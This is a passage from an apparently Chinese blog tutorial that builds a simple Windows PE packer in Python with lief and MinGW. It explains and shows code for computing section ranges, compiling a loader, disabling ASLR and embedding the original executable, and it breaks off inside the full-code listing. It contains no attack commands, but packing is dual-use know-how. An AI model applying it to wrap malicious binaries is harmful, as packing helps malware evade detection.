&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">lief&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">align&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">al&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34; return &amp;lt;x&amp;gt; aligned to &amp;lt;al&amp;gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">al&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">al&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">al&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="42-解析">4.2 解析&lt;/h3>
&lt;p>先分析案例程序，获得必要的数据。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;example.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># calculate shift offset and reserved section size&lt;/span>
&lt;span class="n">image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imagebase&lt;/span>
&lt;span class="n">lowest_rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">min&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_address&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="n">highest_rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">max&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_address&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="n">sect_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[+] analyze origin demo program binary success.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>取得基址、所有 section 中最低的起始 rva 和最高的结束 rva，得到整个 PE 镜像的 Sections 覆盖的内存范围。&lt;/p>
&lt;h3 id="43-构造加载器">4.3 构造加载器&lt;/h3>
&lt;p>使用 MinGW 来完成加载器构造——当然有其他更好的做法，加壳还要装一个 MinGW 未免太麻烦，但我也不知道该怎么做就是了（我猜的话，大概拿 nasm 应该就刑。）&lt;/p>
&lt;p>编译命令在 Python 脚本里生成并执行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># compile shifted loader program&lt;/span>
&lt;span class="n">compile_args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="s1">&amp;#39;loader.c&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-m32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-O2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-Wall&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-Wl,--entry=__start&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-nodefaultlibs&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-nostartfiles&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-lkernel32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-luser32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;-Wl,--image-base=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_base&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;-Wl,--section-start=.text=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">align&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_base&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">highest_rva&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sect_alignment&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-o&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;shifted-loader.exe&amp;#39;&lt;/span>
&lt;span class="p">]&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">check_output&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;gcc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">compile_args&lt;/span>&lt;span class="p">]),&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stderr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">STDOUT&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[+] compile shifted loader program success.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">except&lt;/span> &lt;span class="n">CalledProcessError&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[!] loader compilation failed, &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">raise&lt;/span>
&lt;span class="n">shifted_loader&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;shifted-loader.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">sect_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span>
&lt;span class="n">file_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">file_alignment&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>-luser32&lt;/code> 是因为我添加了一个 &lt;code>MessageBoxA&lt;/code> 的调用。&lt;/p>
&lt;p>&lt;code>-Wl,--image-base=...&lt;/code> 设置了加载器的基址，确保加载器和被加壳的程序落在同一个基址上。&lt;/p>
&lt;p>&lt;code>-Wl,--section-start=...&lt;/code> 因为知道第一个 section 一定是 &lt;code>.text&lt;/code> 所以只设置了第一个 section 的地址，之后的 section 会自动往后挪。&lt;/p>
&lt;p>其他参数不多解释了。&lt;/p>
&lt;p>编译完成后，再解析出加载器的对齐信息，准备用于构造完整的被加壳程序。&lt;/p>
&lt;h3 id="44-构造加壳程序">4.4 构造加壳程序&lt;/h3>
&lt;p>加载器和被加载的程序都已经就绪，接下来就是把加载器和程序合并成加壳后的程序了。这一步还是先在创建 lief 的PE32 对象，然后填充基址、Section 对齐、文件对齐，并且把 DLL Characteristics 重置到 0，目的是声明不支持 ASLR。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># create new binary from scratch&lt;/span>
&lt;span class="n">output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Binary&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;packed&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE_TYPE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE32&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># copy essential fields from shifted_loader&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imagebase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imagebase&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">file_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">file_alignment&lt;/span>
&lt;span class="c1"># disable ASLR&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dll_characteristics&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>先准备这些文件头字段，接下来开始填充 Section ，最先填充的就是准备用作被加载程序内存空间的 &lt;code>.alloc&lt;/code> 节。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># add .alloc section&lt;/span>
&lt;span class="n">allocate_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">align&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">highest_rva&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">lowest_rva&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sect_alignment&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">allocate_section&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.alloc&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">allocate_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lowest_rva&lt;/span>
&lt;span class="n">allocate_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">allocate_size&lt;/span>
&lt;span class="n">allocate_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">characteristics&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MEM_READ&lt;/span>
&lt;span class="o">|&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MEM_WRITE&lt;/span>
&lt;span class="o">|&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CNT_UNINITIALIZED_DATA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">allocate_section&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将 &lt;code>.alloc&lt;/code> 节起始点放置在低位，长度为被加载程序的节大小之和对齐。&lt;/p>
&lt;p>之后开始复制加载器的节。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># copy sections&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1"># let lief recalculate section offset and sizeof raw data&lt;/span>
&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sizeof_raw_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>需要注意&lt;/strong> 把 &lt;code>offset&lt;/code> 和 &lt;code>sizeof_raw_data&lt;/code> 置零，让 &lt;code>lief&lt;/code> 去计算偏移和大小，后面添加的一应节都按这样操作。新创建的 Section 还好，对于从加载器里复制的 Section，保留 &lt;code>offset&lt;/code> 和 &lt;code>sizeof_raw_data&lt;/code> 会导致最终成品的 Section 数据不正确，造成 &lt;code>ntdll&lt;/code> 里加载PE文件时，读取PE数据结构时出错。可以自行用 x32dbg 验证。&lt;/p>
&lt;p>最后把被加载的文件打包进去。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># add packed section&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;example.exe&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;rb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">packed_section&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.packed&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">packed_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="n">packed_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">characteristics&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MEM_READ&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CNT_INITIALIZED_DATA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packed_section&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>同样，让 lief 去计算偏移和大小。复制好节，继续复制 Data Directories，这又有一个坑。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># copy data directories&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">src&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rva&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span>
&lt;span class="c1"># correct number of data directories&lt;/span>
&lt;span class="c1"># warning: size of data directories may disagree with IMAGE_NT_HEADERS.DataDirectory in winnt.h&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">numberof_rva_and_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>需要注意到，&lt;strong>lief 的数据结构里，允许的 data_directories 只有 15 个&lt;/strong>！&lt;strong>但 &lt;code>winnt.h&lt;/code> 里定义的 DATA_DIRECTORIES 数组，是固定16个元素&lt;/strong>！&lt;/p>
&lt;p>如果直接 &lt;code>range(16)&lt;/code> 去遍历，会出现 &lt;code>IndexError&lt;/code> ，如果忽视这个长度问题，直接在加载器里采用 Windows SDK 的头文件定义的结构，会导致取节表指针的时候比预期的多偏移 8 个字节，造成问题。调试起来简直太折磨人了。&lt;/p>
&lt;p>之后再复制入口点和镜像大小。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># copy original address of entrypoint&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">addressof_entrypoint&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">addressof_entrypoint&lt;/span>
&lt;span class="c1"># let lief recalculate size of image&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sizeof_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意，入口点和镜像大小的字段必须在复制完 Section 之后再复制，不然 lief 会犯傻，原因不明，有兴趣可以自己改一改顺序看看结果。&lt;/p>
&lt;p>到这里，基本准备就绪，就可以把构造好的可执行文件写入硬盘了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># build output binary&lt;/span>
&lt;span class="n">builder&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Builder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">builder&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">build&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">builder&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;packed.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="45-完整代码">4.5 完整代码&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># %%&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">lief&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">subprocess&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">STDOUT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CalledProcessError&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">check_output&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">align&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">al&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34; return &amp;lt;x&amp;gt; aligned to &amp;lt;al&amp;gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">al&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">al&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">al&lt;/span>
&lt;span class="c1"># %%&lt;/span>
&lt;span class="c1"># compile origin demo program&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">check_output&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;gcc example.c -m32 -O2 -o example.exe&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stderr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">STDOUT&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">except&lt;/span> &lt;span class="n">CalledProcessError&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[!] demo program compilation failed, &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">raise&lt;/span>
&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;example.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[+] compile origin demo program success.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># %%&lt;/span>
&lt;span class="c1"># calculate shift offset and reserved section size&lt;/span>
&lt;span class="n">image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imagebase&lt;/span>
&lt;span class="n">lowest_rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">min&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_address&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">])&lt;/span>
